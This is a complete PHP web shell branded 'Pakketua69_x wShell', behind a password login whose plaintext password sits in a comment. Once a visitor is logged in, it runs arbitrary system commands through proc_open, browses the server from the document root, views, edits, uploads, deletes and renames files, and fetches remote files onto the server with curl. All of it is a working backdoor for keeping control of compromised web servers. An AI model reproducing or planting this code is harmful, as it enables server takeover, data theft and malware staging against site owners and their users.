<?php
ob_start();
set_time_limit(0);
error_reporting(0);
$hashed_password = '$2y$10$dxCNT/vH8djgIaJrVWhBRuJ0T4eZFKAQdtOyZO7f4m05mlYMG4jIq'; // Kondom123!@#

function admin_login() {
    echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><script src="https://cdn.tailwindcss.com"></script><title>Login</title></head><body class="bg-gradient-to-br from-blue-500 to-purple-600 min-h-screen flex items-center justify-center">';
    echo '<div class="bg-white rounded-lg shadow-2xl p-12 w-full max-w-md">';
    echo '<h1 class="text-3xl font-bold text-center text-gray-800 mb-8">Pakketua69_x wShell</h1>';
    echo '<form method="post" class="space-y-4">';
    echo '<input type="password" name="password" placeholder="Enter password" class="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:outline-none focus:border-blue-500 text-lg">';
    echo '<input type="submit" value="Login" class="w-full px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 cursor-pointer font-bold text-lg">';
    echo '</form>';
    echo '</div></body></html>';
    exit;
}

if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])])) {
    if (isset($_POST['password']) && password_verify($_POST['password'], $hashed_password)) {
        setcookie(md5($_SERVER['HTTP_HOST']), true, time() + 25200);
    } else {
        admin_login();
    }
}

$timezone = date_default_timezone_get();
date_default_timezone_set($timezone);
$rootDirectory = realpath($_SERVER['DOCUMENT_ROOT']);
$scriptDirectory = dirname(__FILE__);

function x($b) {
    return base64_encode($b);
}

function y($b) {
    return base64_decode($b);
}

foreach ($_GET as $c => $d) $_GET[$c] = y($d);

$currentDirectory = realpath(isset($_GET['d']) ? $_GET['d'] : $rootDirectory);
chdir($currentDirectory);

$viewCommandResult = '';
$editFileContent = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['fileToUpload'])) {
        $target_file = $currentDirectory . '/' . basename($_FILES["fileToUpload"]["name"]);
        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
            echo "<div class='message'>File " . htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " uploaded successfully.</div>";
        } else {
            echo "<div class='message'>Error: Failed to upload file.</div>";
        }
    } elseif (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
        $newFolder = $currentDirectory . '/' . $_POST['folder_name'];
        if (!file_exists($newFolder)) {
            mkdir($newFolder);
            echo "<div class='message'>Folder created successfully!</div>";
        } else {
            echo "<div class='message'>Error: Folder already exists!</div>";
        }
    } elseif (isset($_POST['file_name']) && !empty($_POST['file_name'])) {
        $fileName = $_POST['file_name'];
        $newFile = $currentDirectory . '/' . $fileName;
        if (!file_exists($newFile)) {
            if (file_put_contents($newFile, $_POST['file_content']) !== false) {
                echo "<div class='message'>File created successfully!</div>";
            } else {
                echo "<div class='message'>Error: Failed to create file!</div>";
            }
        } else {
            if (file_put_contents($newFile, $_POST['file_content']) !== false) {
                echo "<div class='message'>File edited successfully!</div>";
            } else {
                echo "<div class='message'>Error: Failed to edit file!</div>";
            }
        }
    } elseif (isset($_POST['delete_file'])) {
        $fileToDelete = $currentDirectory . '/' . $_POST['delete_file'];
        if (file_exists($fileToDelete)) {
            if (is_dir($fileToDelete)) {
                if (deleteDirectory($fileToDelete)) {
                    echo "<div class='message'>Folder deleted successfully!</div>";
                } else {
                    echo "<div class='message'>Error: Failed to delete folder!</div>";
                }
            } else {
                if (unlink($fileToDelete)) {
                    echo "<div class='message'>File deleted successfully!</div>";
                } else {
                    echo "<div class='message'>Error: Failed to delete file!</div>";
                }
            }
        } else {
            echo "<div class='message'>Error: File or directory not found!</div>";
        }
    } elseif (isset($_POST['rename_item']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
        $oldName = $currentDirectory . '/' . $_POST['old_name'];
        $newName = $currentDirectory . '/' . $_POST['new_name'];
        if (file_exists($oldName)) {
            if (rename($oldName, $newName)) {
                echo "<div class='message'>Item renamed successfully!</div>";
            } else {
                echo "<div class='message'>Error: Failed to rename item!</div>";
            }
        } else {
            echo "<div class='message'>Error: Item not found!</div>";
        }
    } elseif (isset($_POST['xmd_input'])) {
        $command = $_POST['xmd_input'];
        $descriptorspec = [
            0 => ['pipe', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w']
        ];
        $process = proc_open($command, $descriptorspec, $pipes);
        if (is_resource($process)) {
            $output = stream_get_contents($pipes[1]);
            $errors = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
            if (!empty($errors)) {
                $viewCommandResult = '<hr><p>Result:</p><textarea class="result-box">' . htmlspecialchars($errors) . '</textarea>';
            } else {
                $viewCommandResult = '<hr><p>Result:</p><textarea class="result-box">' . htmlspecialchars($output) . '</textarea>';
            }
        } else {
            $viewCommandResult = '<hr><p>Error: Failed to execute command!</p>';
        }
    } elseif (isset($_POST['view_file'])) {
        $fileToView = $currentDirectory . '/' . $_POST['view_file'];
        if (file_exists($fileToView)) {
            $fileContent = file_get_contents($fileToView);
            $viewCommandResult = '<hr><p>Result: ' . $_POST['view_file'] . '</p><textarea class="result-box">' . htmlspecialchars($fileContent) . '</textarea>';
        } else {
            $viewCommandResult = '<hr><p>Error: File not found!</p>';
        }
    } elseif (isset($_POST['edit_file'])) {
        $fileToEdit = $currentDirectory . '/' . $_POST['edit_file'];
        if (file_exists($fileToEdit)) {
            $editFileContent = file_get_contents($fileToEdit);
        } else {
            echo "<div class='message'>Error: File not found!</div>";
        }
    } elseif (isset($_POST['save_file']) && isset($_POST['file_path'])) {
        $filePath = $_POST['file_path'];
        $fileContent = $_POST['file_content'];
        if (file_put_contents($filePath, $fileContent) !== false) {
            echo "<div class='message'>File saved successfully!</div>";
        } else {
            echo "<div class='message'>Error: Failed to save file!</div>";
        }
    } elseif (isset($_POST['download_url']) && isset($_POST['target_file'])) {
        $url = $_POST['download_url'];
        $targetFile = $currentDirectory . '/' . $_POST['target_file'];
        $ch = curl_init($url);
        $fp = fopen($targetFile, 'w+');
        curl_setopt($ch, CURLOPT_FILE, $fp);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_TIMEOUT, 50);
        curl_exec($ch);
        if (curl_errno($ch)) {
            echo "<div class='message'>Error: " . curl_error($ch) . "</div>";
        } else {
            echo "<div class='message'>File downloaded successfully from $url to $targetFile.</div>";
        }
        curl_close($ch);
        fclose($fp);
    }
}

ob_end_flush();
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Pakketua69_x wShell</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gradient-to-br from-gray-900 to-gray-800 min-h-screen">
<div class="max-w-5xl mx-auto my-12 px-4">
    <div class="bg-gray-800 rounded-lg shadow-2xl p-8 border border-gray-700">
    <?php
    echo '<a href="?d=' . x($scriptDirectory) . '" class="text-blue-400 hover:text-blue-300 font-semibold">[ GO Home ]</a>';
    echo '<hr class="my-4 border-gray-600">
    <p class="text-gray-300 font-semibold mb-2">Current Directory: ';

    $directories = explode(DIRECTORY_SEPARATOR, $currentDirectory);
    $currentPath = '';
    foreach ($directories as $index => $dir) {
        $currentPath .= DIRECTORY_SEPARATOR . $dir;
        echo ' / <a href="?d=' . x($currentPath) . '" class="text-blue-400 hover:underline">' . $dir . '</a>';
    }
    echo '</p>';

    echo '<div class="space-y-4 mt-6">';

    echo '<form method="post" class="flex gap-2">';
    echo '<input type="text" name="folder_name" placeholder="New Folder Name" class="flex-1 px-4 py-2 border border-gray-600 rounded-lg bg-gray-700 text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500">';
    echo '<input type="submit" value="Create Folder" class="px-6 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 cursor-pointer font-semibold">';
    echo '</form>';

    echo '<form method="post" class="space-y-2">';
    echo '<input type="text" name="file_name" placeholder="Create New File / Edit Existing File" class="w-full px-4 py-2 border border-gray-600 rounded-lg bg-gray-700 text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500">';
    echo '<textarea name="file_content" placeholder="File Content" class="w-full px-4 py-2 border border-gray-600 rounded-lg bg-gray-700 text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500 h-32"></textarea>';
    echo '<input type="submit" value="Create / Edit File" class="w-full px-6 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 cursor-pointer font-semibold">';
    echo '</form>';

    echo '<form method="post" enctype="multipart/form-data" class="flex gap-2">';
    echo '<input type="file" name="fileToUpload" id="fileToUpload" class="flex-1 px-4 py-2 border border-gray-600 rounded-lg bg-gray-700 text-white">';
    echo '<input type="submit" value="Upload File" name="submit" class="px-6 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 cursor-pointer font-semibold">';
    echo '</form>';

    echo '<form method="post" class="flex gap-2">';
    echo '<input type="text" name="xmd_input" placeholder="Enter command" class="flex-1 px-4 py-2 border border-gray-600 rounded-lg bg-gray-700 text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500">';
    echo '<input type="submit" value="Run Command" class="px-6 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 cursor-pointer font-semibold">';
    echo '</form>';

    echo '<form method="post" class="space-y-2">';
    echo '<input type="text" name="download_url" placeholder="Enter URL to download" class="w-full px-4 py-2 border border-gray-600 rounded-lg bg-gray-700 text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500">';
    echo '<input type="text" name="target_file" placeholder="Target file name" class="w-full px-4 py-2 border border-gray-600 rounded-lg bg-gray-700 text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500">';
    echo '<input type="submit" value="Download File" class="w-full px-6 py-2 bg-indigo-600 text-white rounded-lg hover:bg-indigo-700 cursor-pointer font-semibold">';
    echo '</form>';

    echo '</div>';

    if ($editFileContent !== '') {
        echo '<form method="post" class="mt-6 space-y-2">';
        echo '<input type="hidden" name="file_path" value="' . htmlspecialchars($fileToEdit) . '">';
        echo '<textarea name="file_content" rows="25" class="w-full px-4 py-2 border border-gray-600 rounded-lg bg-gray-700 text-white focus:outline-none focus:ring-2 focus:ring-blue-500 font-mono text-sm">' . htmlspecialchars($editFileContent) . '</textarea>';
        echo '<input type="submit" name="save_file" value="Save File" class="w-full px-6 py-2 bg-yellow-600 text-white rounded-lg hover:bg-yellow-700 cursor-pointer font-semibold">';
        echo '</form>';
    }

    if ($viewCommandResult) {
        echo '<div class="mt-6 p-4 bg-gray-700 border border-gray-600 rounded-lg">' . str_replace('class="result-box"', 'class="result-box w-full h-96 px-4 py-2 border border-gray-600 rounded-lg bg-gray-900 text-gray-100 font-mono text-sm overflow-auto"', $viewCommandResult) . '</div>';
    }

    echo '<div class="mt-8 overflow-x-auto">';
    echo '<table class="w-full border-collapse">';
    echo '<tr class="bg-gray-700 font-bold text-gray-100"><th class="border border-gray-600 px-4 py-3 text-left">Item Name</th><th class="border border-gray-600 px-4 py-3 text-left">Size</th><th class="border border-gray-600 px-4 py-3 text-left">Date</th><th class="border border-gray-600 px-4 py-3 text-left">Permissions</th><th class="border border-gray-600 px-4 py-3 text-center">View</th><th class="border border-gray-600 px-4 py-3 text-center">Edit</th><th class="border border-gray-600 px-4 py-3 text-center">Delete</th><th class="border border-gray-600 px-4 py-3 text-center">Rename</th></tr>';

    $directories = [];
    $files = [];

    foreach (scandir($currentDirectory) as $item) {
        if ($item == '.' || $item == '..') continue;

        if (is_dir($item)) {
            $directories[] = $item;
        } else {
            $files[] = $item;
        }
    }

    foreach ($directories as $dir) {
        $u = realpath($dir);
        $s = stat($u);
        $itemLink = '?d=' . x($currentDirectory . '/' . $dir);
        $permission = substr(sprintf('%o', fileperms($u)), -4);
        $writable = is_writable($u);
        echo '<tr class="border border-gray-600 hover:bg-gray-700">
                <td class="border border-gray-600 px-4 py-3 flex items-center gap-2 text-blue-400">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="20" height="20" fill="currentColor"><path d="M10 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2h-8l-2-2z"/></svg>
                    <a href="' . $itemLink . '" class="hover:underline text-gray-200">' . $dir . '</a>
                </td>
                <td class="border border-gray-600 px-4 py-3 text-gray-400">--</td>
                <td class="border border-gray-600 px-4 py-3 text-gray-400 text-sm">' . date('Y-m-d H:i:s', $s['mtime']) . '</td>
                <td class="border border-gray-600 px-4 py-3 font-bold ' . ($writable ? 'text-green-400' : 'text-red-400') . '">' . $permission . '</td>
                <td class="border border-gray-600 px-4 py-3 text-center"><input type="submit" value="View" disabled class="px-2 py-1 bg-gray-600 text-gray-400 rounded text-sm cursor-not-allowed"></td>
                <td class="border border-gray-600 px-4 py-3"></td>
                <td class="border border-gray-600 px-4 py-3"><form method="post" class="inline"><input type="hidden" name="delete_file" value="' . htmlspecialchars($dir) . '"><input type="submit" value="Delete" class="px-2 py-1 bg-red-600 text-white rounded hover:bg-red-700 text-sm cursor-pointer"></form></td>
                <td class="border border-gray-600 px-4 py-3"><form method="post" class="flex gap-1"><input type="hidden" name="old_name" value="' . htmlspecialchars($dir) . '"><input type="text" name="new_name" placeholder="New Name" class="px-2 py-1 border border-gray-600 rounded bg-gray-700 text-white text-sm"><input type="submit" name="rename_item" value="Rename" class="px-2 py-1 bg-yellow-600 text-white rounded hover:bg-yellow-700 text-sm cursor-pointer"></form></td>
            </tr>';
    }

    foreach ($files as $file) {
        $u = realpath($file);
        $s = stat($u);
        $itemLink = '?d=' . x($currentDirectory) . '&f=' . x($file);
        $permission = substr(sprintf('%o', fileperms($u)), -4);
        $writable = is_writable($u);
        echo '<tr class="border border-gray-600 hover:bg-gray-700">
                <td class="border border-gray-600 px-4 py-3 flex items-center gap-2 text-cyan-400">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="20" height="20" fill="currentColor"><path d="M6 2h9l5 5v13c0 1.1-.9 2-2 2H6c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2z"/></svg>
                    <a href="' . $itemLink . '" class="hover:underline text-gray-200">' . $file . '</a>
                </td>
                <td class="border border-gray-600 px-4 py-3 text-gray-400 text-sm">' . formatBytes(filesize($u)) . '</td>
                <td class="border border-gray-600 px-4 py-3 text-gray-400 text-sm">' . date('Y-m-d H:i:s', $s['mtime']) . '</td>
                <td class="border border-gray-600 px-4 py-3 font-bold ' . ($writable ? 'text-green-400' : 'text-red-400') . '">' . $permission . '</td>
                <td class="border border-gray-600 px-4 py-3"><form method="post" class="inline"><input type="hidden" name="view_file" value="' . htmlspecialchars($file) . '"><input type="submit" value="View" class="px-2 py-1 bg-blue-600 text-white rounded hover:bg-blue-700 text-sm cursor-pointer"></form></td>
                <td class="border border-gray-600 px-4 py-3"><form method="post" class="inline"><input type="hidden" name="edit_file" value="' . htmlspecialchars($file) . '"><input type="submit" value="Edit" class="px-2 py-1 bg-orange-600 text-white rounded hover:bg-orange-700 text-sm cursor-pointer"></form></td>
                <td class="border border-gray-600 px-4 py-3"><form method="post" class="inline"><input type="hidden" name="delete_file" value="' . htmlspecialchars($file) . '"><input type="submit" value="Delete" class="px-2 py-1 bg-red-600 text-white rounded hover:bg-red-700 text-sm cursor-pointer"></form></td>
                <td class="border border-gray-600 px-4 py-3"><form method="post" class="flex gap-1"><input type="hidden" name="old_name" value="' . htmlspecialchars($file) . '"><input type="text" name="new_name" placeholder="New Name" class="px-2 py-1 border border-gray-600 rounded bg-gray-700 text-white text-sm"><input type="submit" name="rename_item" value="Rename" class="px-2 py-1 bg-yellow-600 text-white rounded hover:bg-yellow-700 text-sm cursor-pointer"></form></td>
            </tr>';
    }

    echo '</table></div>';
    ?>
    </div>
    </div>
    <?php

    function formatBytes($bytes, $precision = 2) {
        $units = ['B', 'KB', 'MB', 'GB'];
        $bytes = max($bytes, 0);
        $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
        $pow = min($pow, count($units) - 1);
        $bytes /= (1 << (10 * $pow));
        return round($bytes, $precision) . ' ' . $units[$pow];
    }

    function deleteDirectory($dir) {
        if (!file_exists($dir)) {
            return true;
        }
        if (!is_dir($dir)) {
            return unlink($dir);
        }
        foreach (scandir($dir) as $item) {
            if ($item == '.' || $item == '..') {
                continue;
            }
            if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
                return false;
            }
        }
        return rmdir($dir);
    }
    ?>
</body>
</html>
